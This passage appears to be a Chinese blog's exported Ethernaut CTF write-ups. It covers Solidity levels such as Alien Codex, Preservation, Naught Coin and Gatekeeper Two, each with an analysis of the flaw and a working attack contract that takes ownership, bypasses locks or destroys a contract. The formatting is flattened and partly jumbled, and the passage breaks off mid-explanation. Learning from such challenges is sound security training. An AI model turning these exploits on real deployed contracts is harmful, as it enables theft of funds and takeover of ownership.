[参考视频](https://www.youtube.com/watch?v=Lx0L_3RuJ8c) 写的攻击合约：- ```solidity contract Hack &#123; constructor(Denial target) &#123; target.setWithdrawPartner(address(this)); &#125; fallback() external payable &#123; assembly &#123; invalid() &#125; &#125; &#125; 3. 解题 3.1 获取关卡实例地址：0xa22A605788d9828cb51eAd6AA5d5549cb40Da5F0 3.2 将实力地址作为参数，用以部署攻击合约 3.3 提交案例 3.4 成功！！！！","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"},{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"Alien Codex","slug":"Smart contracts/ethernaut/Alien Codex","date":"2023-01-19T04:10:10.000Z","updated":"2023-01-19T04:10:10.000Z","comments":true,"path":"2023/01/19/Smart contracts/ethernaut/Alien Codex/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/19/Smart%20contracts/ethernaut/Alien%20Codex/","excerpt":"","text":"Alien Codex1. 题目要求 1.1 你打开了一个 Alien 合约. 申明所有权来完成这一关. 这可能有帮助 理解Array Storage是怎么回事 理解 ABI specifications 使用一个非常 狗 方法 1.2 题目代码： // SPDX-License-Identifier: MIT pragma solidity ^0.5.0; import &#39;../helpers/Ownable-05.sol&#39;; contract AlienCodex is Ownable &#123; bool public contact; bytes32[] public codex; modifier contacted() &#123; assert(contact); _; &#125; function make_contact() public &#123; contact = true; &#125; function record(bytes32 _content) contacted public &#123; codex.push(_content); &#125; function retract() contacted public &#123; codex.length--; &#125; function revise(uint i, bytes32 _content) contacted public &#123; codex[i] = _content; &#125; &#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445## 2. 分析#### tips: [参考博客](https://dac.ac/blog/ethernaut_solutions/#delegation)- 2.1 在 AlienCodex 合约中，我们可以利用该`retract()`函数导致数组长度出现整数下溢`codex`。这个下溢允许我们通过函数修改合约中的任何状态变量`revise()`。该漏洞可以按如下方式执行： 1. 调用`make_contact()`函数通过`contacted()`修饰符检查，要求`contact`为真。 2. 调用`retract()`函数导致数组`codex`长度整数溢出 3. 通过以下方式找到状态变量的散列，`owner`就好像它是`codex`数组的一部分一样： - 获取数组中第一项的哈希值`codex`（因为它在合约存储中被索引），对应于它在合约存储中的槽位。这可以通过计算第一个*位置*的 Keccak256 哈希值来获得，因此：`keccak256(0x0000000000000000000000000000000000000000000000000000000000000001)`。 - 取由此 ( `0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6`) 产生的哈希值，并从合约中的最大插槽数量中减去其整数值加一 (2个256−1个), 大概是这样的： - ![image-20230225150415772](https://cdn.staticaly.com/gh/LBiyou/BlogImages@main/img/202306020020955.png)d.使用这个结果值作为`revise()`要修改的`i`数组的（索引)和我们的地址。`codex``_content`- 2.2 [参考视频](https://www.youtube.com/watch?v=2onc3F6Lbg0) 写的攻击合约- ```solidity interface IAlienCodex &#123; function owner() external view returns (address); function make_contact() external; function revise(uint i, bytes32 _content) external; function retract() external; &#125; contract Hack &#123; constructor(IAlienCodex target) &#123; target.make_contact(); target.retract(); uint256 h = uint256(keccak256(abi.encode(uint256(1)))); uint256 i = uint256(0) - h; // unchecked &#123; // i = i - h; // &#125; target.revise(i, bytes32(uint256(uint160(msg.sender)))); require(target.owner() == msg.sender, &quot;Hack Failed&quot;); &#125; &#125; 3. 解题 3.1 获取关卡实例地址：0x175A96bA1755F20E85ff80089ec9000dD0df463e 3.2 将实例地址作为参数进行对攻击合约的部署 3.3 提交案例 3.4 成功！！！！","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"},{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"MagicNumber","slug":"Smart contracts/ethernaut/MagicNumber","date":"2023-01-19T01:10:10.000Z","updated":"2023-01-19T01:10:10.000Z","comments":true,"path":"2023/01/19/Smart contracts/ethernaut/MagicNumber/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/19/Smart%20contracts/ethernaut/MagicNumber/","excerpt":"","text":"MagicNumber1. 题目要求 1.1 To solve this level, you only need to provide the Ethernaut with a Solver, a contract that responds to whatIsTheMeaningOfLife() with the right number. Easy right? Well… there’s a catch. The solver’s code needs to be really tiny. Really reaaaaaallly tiny. Like freakin’ really really itty-bitty tiny: 10 opcodes at most. Hint: Perhaps its time to leave the comfort of the Solidity compiler momentarily, and build this one by hand O_o. That’s right: Raw EVM bytecode. Good luck 1.2 译：要解决这个关卡，你只需要向 Ethernaut 提供一个，一个用正确的数字Solver响应的合约。whatIsTheMeaningOfLife() 简单吧？嗯…有一个问题。 求解器的代码需要非常小。真的很小。就像 freakin’ really really itty-bitty tiny：最多 10 个操作码。 提示：也许是时候暂时离开 Solidity 编译器的舒适环境，并手动构建这个 O_o。没错：原始 EVM 字节码。 祝你好运！ 1.3 题目代码： // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract MagicNum &#123; address public solver; constructor() &#123;&#125; function setSolver(address _solver) public &#123; solver = _solver; &#125; /* ____________/\\\\\\_______/\\\\\\\\\\\\\\\\\\_____ __________/\\\\\\\\\\_____/\\\\\\///////\\\\\\___ ________/\\\\\\/\\\\\\____\\///______\\//\\\\\\__ ______/\\\\\\/\\/\\\\\\______________/\\\\\\/___ ____/\\\\\\/__\\/\\\\\\___________/\\\\\\//_____ __/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_____/\\\\\\//________ _\\///////////\\\\\\//____/\\\\\\/___________ ___________\\/\\\\\\_____/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_ ___________\\///_____\\///////////////__ */ &#125; 123456789101112131415161718192021222324252627282930313233- ## 2. 分析#### tips： [参考博客](https://medium.com/coinmonks/ethernaut-lvl-19-magicnumber-walkthrough-how-to-deploy-contracts-using-raw-assembly-opcodes-c50edb0f71a2)- 2.1有一个在调用时`whatIsTheMeaningOfLife`应答`0x000000000000000000000000000000000000000000000000000000000000002a`(bytes32) 的函数。这是十进制的 42 的十六进制转换。2）我们的合约代码必须小于10字节 这些要求似乎无法实现，即使使用原始字节码来定义函数、处理函数选择器等，也将远远超过 10 字节的代码。 但是我们真的需要有那个功能吗？最后，我们必须塑造合约代码才能通过挑战。如果我们的合同，无论它如何执行，**只**返回**42**怎么办？ 这就是诀窍！如果你认为它就像拥有一个 Solidity 智能合约而不是只有一个`fallback`函数，那么无论你尝试低级调用哪个函数，它都将始终且只执行该`fallback`函数。- 2.2 现在我们需要部署我们刚刚在上一节中编写的最小合约。当一个智能合约被创建时（via `CREATE`or `CREATE2`opcode），EVM 会执行一次构造函数代码，并且部署的智能合约的代码会被 opcode 返回`RETURN`（这个返回的代码称为运行时代码，它是将要执行的代码当您与智能合约交互时）- [参考视频](https://www.youtube.com/watch?v=gUVS4EcrQQQ) 写的攻击合约：- ```solidity contract Hack &#123; constructor(MagicNum target) &#123; bytes memory bytecode = hex&quot;69602a60005260206000f3600052600a6016f3&quot;; address addr; assembly &#123; addr := create(0, add(bytecode, 0x20), 0x13) &#125; require(addr != address(0)); target.setSolver(addr); &#125; &#125; 3. 解题 3.1 获取关卡实例地址：0x5072f4af6D9B0907833C43b199000347158f685d 3.2 传入实例地址部署攻击合约 3.3 提交实例 3.4 成功！！！！","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"},{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"Recovery","slug":"Smart contracts/ethernaut/Recovery","date":"2023-01-18T11:10:10.000Z","updated":"2023-01-18T11:10:10.000Z","comments":true,"path":"2023/01/18/Smart contracts/ethernaut/Recovery/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/18/Smart%20contracts/ethernaut/Recovery/","excerpt":"","text":"Recovery1. 题目要求 1.1 合约创建者构建了一个非常简单的代币工厂合约。 任何人都可以轻松创建新代币。 在部署了一个代币合约后，创建者发送了 0.001 以太币以获得更多代币。 后边他们丢失了合约地址。 如果您能从丢失的的合约地址中找回(或移除)，则顺利通过此关。 1.2 题目代码 // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract Recovery &#123; //generate tokens function generateToken(string memory _name, uint256 _initialSupply) public &#123; new SimpleToken(_name, msg.sender, _initialSupply); &#125; &#125; contract SimpleToken &#123; string public name; mapping (address =&gt; uint) public balances; // constructor constructor(string memory _name, address _creator, uint256 _initialSupply) &#123; name = _name; balances[_creator] = _initialSupply; &#125; // collect ether in return for tokens receive() external payable &#123; balances[msg.sender] = msg.value * 10; &#125; // allow transfers of tokens function transfer(address _to, uint _amount) public &#123; require(balances[msg.sender] &gt;= _amount); balances[msg.sender] = balances[msg.sender] - _amount; balances[_to] = _amount; &#125; // clean up after ourselves function destroy(address payable _to) public &#123; selfdestruct(_to); &#125; &#125; 123456789101112131415161718192021222324252627282930313233343536373839## 2. 分析#### tips： [参考博客](https://dac.ac/blog/ethernaut_solutions/#delegation)- 2.1合约地址是确定性的，可以从合约的部署者地址和来自部署者的部署交易的随机数中得出。 在这种情况下，我们从一开始就有这些信息： 1. 合同部署者地址（我们的例子，在我的例子中`0xc03f501C5987CAaC9e4470849f13eEA338b76E9f`） 2. 部署第一个 SimpleToken 的随机数（1 如练习所述） 因此，我们可以轻松计算出第一个 SimpleToken 部署的合约地址，结果为`0xa26D4caf289D657F24f8d2D26f0DFe99a0B312db`. 从技术上讲，这里很容易作弊，因为通过检查实例合约的内部交易，很容易在区块浏览器上看到我们要排空的合约的合约地址。然而，练习的目的是我们自己推导出地址。 有了这些信息，我们现在要做的就是调用`destroy()`SimpleToken 合约中的函数，并将其中的资金定向到任何地址，以便将练习标记为已完成。- 2.2 做法：- 一旦我们有了这两个细节（部署地址，随机数），就像我在[解决方案](https://dac.ac/blog/ethernaut_solutions/#solution-15)中描述的那样，我们就可以在 python 中（或直接在 solidity 中）编写一个函数来获取地址。作为一个足智多谋的开发人员，即使我知道如何计算它，我仍然决定去 StackExchange 中找到一个现成的解决方案以跳过这个：- ``` js # compute address of a given contract to be deployed from # the deployer address + nonce, as stated in the Section 7 # of the Ethereum yellowpaper for contracts created using CREATE def mk_contract_address(sender: str, nonce: int) -&gt; str: &quot;&quot;&quot;Create a contract address using eth-utils. # Modified from Mikko Ohtamaa&#x27;s original answer which was later # edited by Utgarda # Obtained from https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed &quot;&quot;&quot; sender_bytes = to_bytes(hexstr=sender) raw = rlp.encode([sender_bytes, nonce]) h = keccak(raw) address_bytes = h[12:] return to_checksum_address(address_bytes) 然后，我们可以插入这些值并找到第一个 SimpleToken 部署的地址： first_simpletoken_contract_address &#x3D; mk_contract_address(recovery.address, 1) 连接到这个合约并调用destroy()函数，将资金发送到我的地址。 simpletoken.destroy(acc.address, _from) 攻击合约来自 参考视频 contract Dev &#123; function recover(address sender) external pure returns (address) &#123; address addr = address(uint160(uint256( keccak256(abi.encodePacked( bytes1(0xd6), bytes1(0x94), sender, bytes1(0x01) )) ))); return addr; &#125; &#125; 3. 解题 3.1 获取实例地址：0x7802095a90641cd76543bc7df683d24D4bdd4436 3.2 部署Dev合约，调用合约中的recover() 函数，传入的形参为关卡实例 3.3 将调用recover() 函数 返回的地址带到区块链浏览器上查看交易 3.3 使用recover() 函数 返回的地址获取部署的SimpleToken合约，并将调用SimpleToken合约中的destroy() 函数，传入的形参为自己 的钱包地址 3.4 执行destroy() 函数之后，到区块链浏览器中再去查看地址的余额为0 3.5 提交案例 3.6 成功！！！！","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"},{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"Preservation","slug":"Smart contracts/ethernaut/Preservation","date":"2023-01-18T09:10:10.000Z","updated":"2023-01-18T09:10:10.000Z","comments":true,"path":"2023/01/18/Smart contracts/ethernaut/Preservation/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/18/Smart%20contracts/ethernaut/Preservation/","excerpt":"","text":"Preservation1.题目要求 1.1 该合约利用库合约保存 2 个不同时区的时间戳。合约的构造函数输入两个库合约地址用于保存不同时区的时间戳。 通关条件：尝试取得合约的所有权（owner）。 可能有帮助的注意点： 深入了解 Solidity 官网文档中底层方法 delegatecall 的工作原理，它如何在链上和库合约中的使用该方法，以及执行的上下文范围。 理解 delegatecall 的上下文保留的含义 理解合约中的变量是如何存储和访问的 理解不同类型之间的如何转换 1.2 题目代码： // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract Preservation &#123; // public library contracts address public timeZone1Library; address public timeZone2Library; address public owner; uint storedTime; // Sets the function signature for delegatecall bytes4 constant setTimeSignature = bytes4(keccak256(&quot;setTime(uint256)&quot;)); constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) &#123; timeZone1Library = _timeZone1LibraryAddress; timeZone2Library = _timeZone2LibraryAddress; owner = msg.sender; &#125; // set the time for timezone 1 function setFirstTime(uint _timeStamp) public &#123; timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp)); &#125; // set the time for timezone 2 function setSecondTime(uint _timeStamp) public &#123; timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp)); &#125; &#125; // Simple library contract to set the time contract LibraryContract &#123; // stores a timestamp uint storedTime; function setTime(uint _time) public &#123; storedTime = _time; &#125; &#125; 123456789101112131415161718192021222324## 2. 分析#### [参考文章1](https://stermi.medium.com/the-ethernaut-challenge-16-solution-preservation-bc2fe5abec4d) [参考文章2](https://dac.ac/blog/ethernaut_solutions/#delegation)#### 第一类分析方法- 2.1 目标：声明对给定实例的所有权- 2.2 它有一个`uint256 storedTime`状态变量和一个 setter 函数`setTime`，可以根据用户的输入更新状态变量。- ```solidity // Simple library contract to set the time contract LibraryContract &#123; // stores a timestamp uint storedTime; function setTime(uint _time) public &#123; storedTime = _time; &#125; &#125; 2.3 分析主函数的代码 它有五个不同的状态变量 address public timeZone1Library第一时区图书馆地址 address public timeZone2Library第二时区图书馆地址 address public owner所有者的地址 uint256 storedTime两个时区库之一存储的时间 bytes4 constant setTimeSignature``setTime时区库中函数的签名。constant由于关键字，这不是真正的状态变量 合约的the constructorof the contract 采用两种address类型的输入来设置两个库地址并将所有者设置为msg.sender. 然后我们有两个不同的功能 function setFirstTime(uint256 _timeStamp) public function setSecondTime(uint256 _timeStamp) public 它们是相同的，它们只是在两个不同的时区库上执行相同的代码 当Preservation合约执行时setFirstTime(100)，它会调用LibraryContract.setTime(100)via delegatecall。 执行的代码来自合约LibraryContract，但使用的上下文是执行操作码的上下文delegatecall。当我们谈论上下文时，我们指的是存储、当前发送者( msg.sender) 和当前值( msg.value)。 如果**LibraryContract**修改状态，它不会修改自己的状态，而是修改调用者（**Preservation**）的状态！这意味着当LibraryContract.setTime更新storedTime状态变量时，不是从它自己的合约更新变量，而是更新调用者合约的slot0中的变量，即timeZone1Library地址。 setSecondTime执行函数时会发生同样的事情，它将更新合约slot0Preservation中的变量。 我们如何利用这个漏洞？有没有办法修改delegatecall存储状态变量信息的第三个存储槽owner？ 好吧，不是直接来自setFirstTime，否则会修改slot0setSecondTime变量的值。但是，如果我们将slot0地址替换为我们已部署的合约的地址，这将模拟相同的布局存储并且确实会更新slot3变量怎么办？ 第二类分析方法 保存合约使用地址中分配的合约timeZone1Library和timeZone2Library库合约。因此，对这些合约的所有调用都是在保存合约中完成的delegatecall，不会触及每个合约的存储LibraryContract，而是触及保存合约的存储。 当我们storedTime通过库合约中的函数修改变量时，我们不是在库或保存合约中修改delegatecall，而是在保存合约中占用相应存储槽的变量。setTime()``storedTimestoredTime 因此，调用setFirstTime()orsetSecondTime()将timeZone1Library使用我们作为 传递的任何值进行修改_timeStamp。因此，为了利用合约并成为owner，我们需要部署一个与Preservation 具有相同存储布局的合约，这意味着我们的攻击者合约应该定义： 123address public timeZone1Library;address public timeZone2Library;address public owner; 与保存的顺序完全相同。 此外，攻击者合约中必须定义两个附加功能： 一个setTime()带有uint256参数的函数，在攻击者合约的情况下，它将修改其第三个内存槽中的变量，因此owner。这个变量的名称无关紧要，因为我们只对修改 Preservation 中的第 3 个内存槽感兴趣，但为了保持一致，我也将其命名为owner。 123function setTime(uint256) public &#123; owner = tx.origin;&#125; 在保护中调用的函数setFirstTime()，以使timeZone1Library攻击者签订合同。如果每个 LibraryContract 都使用与 Preservation 相同的布局进行正确编码，则 Preservation 合约不会以这种方式受到攻击。 123function setFirstTimeExploit() external &#123; preservationContract.setFirstTime(uint256(address(this)));&#125; preservationContract保存合同的接口在哪里。 因此流程如下： 通过从攻击者合约调用来创建攻击者合约timeZone1Library地址setFirstTime()。 使用setFirstTime()任何无符号整数作为参数调用保存合约，该合约setTime()在攻击者合约中执行，生成owner我们的原始地址。 参考视频 写的攻击合约 contract Hack &#123; address public timeZone1Library; address public timeZone2Library; address public owner; function attack(Preservation target) external &#123; target.setFirstTime(uint256(uint160(address(this)))); target.setFirstTime(uint256(uint160(msg.sender))); require(target.owner() == msg.sender, &quot;hack failed&quot;); &#125; function setTime(uint _owner) external &#123; owner = address(uint160(_owner)); &#125; &#125; 3. 解题 3.1 获取关卡实例地址：0x5E4d571ae5dAA2A4D530a1a5B89C11d6fEae8440 3.2 部署攻击合约，调用Hack 合约中的attack() 函数，形参是实例地址 3.3 提交案例 3.4 成功！！！！","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"},{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"Naught Coin","slug":"Smart contracts/ethernaut/Naught Coin","date":"2023-01-18T07:10:10.000Z","updated":"2023-01-18T07:10:10.000Z","comments":true,"path":"2023/01/18/Smart contracts/ethernaut/Naught Coin/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/18/Smart%20contracts/ethernaut/Naught%20Coin/","excerpt":"","text":"Naught Coin1. 题目要求 1.1 NaughtCoin 是一种 ERC20 代币，而且您已经持有这些代币。问题是您只能在 10 年之后才能转移它们。您能尝试将它们转移到另一个地址，以便您可以自由使用它们吗？通过将您的代币余额变为 0 来完成此关卡。 这可能有用 ERC20标准 OpenZeppelin仓库 1.2 题目代码： // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; import &#39;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol&#39;; contract NaughtCoin is ERC20 &#123; // string public constant name = &#39;NaughtCoin&#39;; // string public constant symbol = &#39;0x0&#39;; // uint public constant decimals = 18; uint public timeLock = block.timestamp + 10 * 365 days; uint256 public INITIAL_SUPPLY; address public player; constructor(address _player) ERC20(&#39;NaughtCoin&#39;, &#39;0x0&#39;) &#123; player = _player; INITIAL_SUPPLY = 1000000 * (10**uint256(decimals())); // _totalSupply = INITIAL_SUPPLY; // _balances[player] = INITIAL_SUPPLY; _mint(player, INITIAL_SUPPLY); emit Transfer(address(0), player, INITIAL_SUPPLY); &#125; function transfer(address _to, uint256 _value) override public lockTokens returns(bool) &#123; super.transfer(_to, _value); &#125; // Prevent the initial owner from transferring tokens until the timelock has passed modifier lockTokens() &#123; if (msg.sender == player) &#123; require(block.timestamp &gt; timeLock); _; &#125; else &#123; _; &#125; &#125; &#125; 1234567891011121314151617181920212223242526## 2. 分析- 2.1 通过让您的代币余额为 0 来完成此级别- 2.2 ***tips：\\****在*`*constructor*`*.* `*_mint*`*在执行合约*`*emit*`*事件**后*`*Transfer*`*，不知道 OpenZeppelin*`*_mint*`*函数的本机实现已经是*`*emit*`*事件*`*Transfer*`- 要解决这个合约，我们需要知道 ERC20 代币的 EIP（以太坊改进提案）是如何工作的，以及 OpenZeppelin 是如何实现它的（该合约使用的是 OpenZeppelin 框架库）。 您可以从这些链接中找到所需的所有信息： - [以太坊 EIP-20](https://eips.ethereum.org/EIPS/eip-20) - [OpenZeppelin ERC20 文档](https://docs.openzeppelin.com/contracts/4.x/api/token/erc20) - [OpenZeppelin ERC20 实现](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol) 转移代币有两种方式： - 通过`transfer`允许`msg.sender`直接将代币转移到`recipient` - 通过`transferFrom`允许外部任意`sender`（可能是代币本身的所有者）代表所有者将`amount`代币转移到`recipient`. 在发送这些代币之前，所有者必须已**批准**管理`sender`该数量的代币 因为`transfer`方法已经`overrided`约定好了`NaughtCoin`，我们可以使用函数来规避限制`transferFrom`。 这是我们需要做的： 1) 创建一个二级账户，将我们所有的代币转移到 2) 在调用之前批准我们自己管理全部代币`transferFrom`3) 调用`transferFrom(player, secondaryAccount, token.balanceOf(player))`4) 随心所欲地使用代币！ NaughtCoin`合约应该实施什么才能真正锁定我们的代币**10 年**？他们可以实现EIP-20 定义的**一个挂钩**`overriding`，称为.`transfer``_beforeTokenTransfer 12345678910111213141516171819202122232425 当发生任何类型的令牌传输时，将调用此挂钩： - `mint`（从地址转移`0x`到用户） - `burn`（从用户转移到`0x`地址） - `transfer` - `transferFrom` 通过这样做，他们可以防止这种利用。- 2.3 [参考视频](https://www.youtube.com/watch?v=f4QDmG2Cgc0) 写的攻击合约- ```solidity interface INaughtCoin &#123; function player() external view returns (address); &#125; contract Hack &#123; function pwn(IERC20 coin) external &#123; address player = INaughtCoin(address(coin)).player(); uint bal = coin.balanceOf(player); coin.transferFrom(player, address(this), bal); &#125; &#125; 2.4 解题步骤为： // 1.Deploy // 2.coin.approve(hack, amount) // 3.pwn() 3. 解题 3.1 获取关卡实例地址：0x34df3070B62B46bCBc4d0a2cbCcd670109041b8a 3.2 部署攻击合约 Hack 3.3 根据关卡实例地址 生成 IECR20 合约 3.4 调用IECR20 合约中的balanceOf() 函数查看当前账户余额 3.5 再调用IECR20 合约的approve() 函数，传入Hack 合约地址和 所查账户余额 3.6 调用Hack 合约中的pwn() 函数 传入关卡实例 3.7 回到IECR20 合约中调用balanceOf() 函数查看当前账户余额 3.8 提交实例 3.9 成功！！！！","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"},{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"Gatekeeper Two","slug":"Smart contracts/ethernaut/GatekeeperTwo","date":"2023-01-09T05:02:15.000Z","updated":"2023-01-09T05:02:15.000Z","comments":true,"path":"2023/01/09/Smart contracts/ethernaut/GatekeeperTwo/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/09/Smart%20contracts/ethernaut/GatekeeperTwo/","excerpt":"","text":"Gatekeeper Two1. 题目要求 1.1 题目：这个守门人带来了一些新的挑战, 同样的需要注册为参赛者来完成这一关 这可能有帮助: 想一想你从上一个守门人那学到了什么. 第二个门中的 assembly 关键词可以让一个合约访问非原生的 vanilla solidity 功能. 参见 here . extcodesize 函数可以用来得到给定地址合约的代码长度 - 你可以在这个页面学习到更多 yellow paper. ^ 符号在第三个门里是位操作 (XOR), 在这里是代表另一个常见的位操作 (参见 here). Coin Flip 关卡也是一个很好的参考. 1.2 题目代码： // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract GatekeeperTwo &#123; address public entrant; modifier gateOne() &#123; require(msg.sender != tx.origin); _; &#125; modifier gateTwo() &#123; uint x; assembly &#123; x := extcodesize(caller()) &#125; require(x == 0); _; &#125; modifier gateThree(bytes8 _gateKey) &#123; require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max); _; &#125; function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123; entrant = tx.origin; return true; &#125; &#125; 1234567891011121314## 2. 分析- 2.1 与 Gatekeeper One 一样，我们必须成功通过函数的 3 次修饰符检查`enter()`才能创建`entrant`我们的地址- 2.2 交易必须从合约发送，以便合约地址 ( `msg.sender`) 与合约调用者 ( `tx.origin`) 不同。- `msg.sender`和`tx.origin`- ![image-20230225003313354](https://cdn.staticaly.com/gh/LBiyou/BlogImages@main/img/202306020023378.png)- 在函数调用者上运行 solidity 汇编操作码的结果`extcodesize()`返回调用者合约代码的长度，但是，当我们从合约调用的构造函数执行外部调用时，`extcodesize()`返回零，因为合约在构造期间没有可用的源代码. Consensys 智能合约最佳实践页面中的[此页面详细介绍了它。](https://consensys.github.io/smart-contract-best-practices/development-recommendations/solidity-specific/extcodesize-checks/)因此，这`extcodesize()`不是检查外部调用是由合约还是外部拥有的帐户执行的可靠方法。我们在这里要做的就是运行`enter()`从调用合约的构造函数调用函数的代码。- 按位`XOR`和通过它操作的每个元素都是它自己的逆，所以如果我们有如果：```jsuint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1 为真，则： 1uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(0) - 1 == uint64(_gateKey) 也是如此。因此，*我们不需要_gateKey*，我们可以简单地将结果uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(0) - 1作为参数传递，enter()但强制转换为bytes8as 这就是所enter()需要的。 参考博客 门 1：msg.sender和tx.origin 要打开这扇门，我们必须了解msg.sender它们tx.origin之间的区别。 让我们看看 Solidity 文档对这些全局变量的看法： msg.sender( address): 消息的发送者（当前通话） tx.origin( address): 交易的发送方（完整的调用链） 当交易由 EOA 进行并直接与智能合约交互时，这些变量将具有相同的值。但是，如果它与中间人合约交互A，然后B通过直接调用（而不是 a delegatecall）与另一个合约交互，那么这些值将不同。 在这种情况下： msg.sender将有 EOA 地址 tx.origin``A将有合同的地址 因为为了gateOne不恢复，我们需要让msg.sender != tx.origin这意味着我们必须enter从智能合约而不是直接从玩家的 EOA 调用。 这不是挑战的一部分，但我建议您阅读我在进一步阅读中列出的关于一些安全问题和最佳实践tx.orgin以及何时不应使用它的内容。 关卡2：背后的玄机extcodesize 第二个门是了解更多关于合约如何部署以及合约在部署过程中的生命周期的绝好机会。 让我们看看函数的代码： 12345678修饰符 gateTwo() &#123; uint256 x; 程序集 &#123; x := extcodesize(caller()) &#125; require(x == 0); _; &#125; 如果这是您第一次看到关键字assembly ，请不要害怕。这就是 Solidity 允许您使用称为Yul. 这里不是讨论这个话题的地方，但如果您想了解更多， Solidity 文档网站上有大量关于 Yul 的内容。 让我们看看这两个操作码在执行时做了什么： CALLER操作码返回调用者帐户的 20 字节地址。这是执行最后一次调用的帐户（委托调用除外）。 EXCODESIZE操作码在执行时返回作为参数传递的地址的代码大小（以字节为单位）。 这个门要求的code大小caller必须是0。 如果caller是一个总是返回零的 EOA（外部拥有账户），但事实并非如此，因为正如我们所说，msg.sender由于第一门要求，调用者 ( ) 必须是智能合约。 智能合约如何实现零代码？好吧，这是真的有一个特例。智能合约在编译时有两种不同的字节码。 创建字节码是以太坊创建合约和只执行一次构造函数所需的字节码 运行时字节码是合约的真实代码，存储在区块链中的代码将用于执行您的智能合约功能 当执行构造函数初始化合约存储时，它返回运行时字节码。直到构造函数的最后，合约本身没有任何运行时字节码，这意味着如果你调用address(contract).code.length它会返回0！ 如果您想在 EVM 级别阅读更多相关信息，可以深入阅读 OpenZeppelin 博客文章解构 Solidity 合约——第二部分：创建与运行时 因此，要通过第二道门，我们只需要从智能合约enter中调用即可！Exploiter``constructor Gate 3：铸造、向下铸造和位运算 最后一扇门是另一扇让你大吃一惊的门。你准备好了吗？ 我们再次讨论类型和位运算之间的转换 来看看需求uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1 合约是用0.8.x之前的Solidity版本编译的，所以在执行数学运算时不会回滚uint64(0) - 1。此操作是表达“给我 auint64可以容纳的最大数量”的“旧方法”。你可以通过做来表达同样的事情type(uint64).max。 该部分从（在这种情况下是合同）中bytes8(keccak256(abi.encodePacked(msg.sender)))获取不太重要的内容并将它们转换为8 bytes``msg.sender``Exploiter``uint64 该指令a ^ 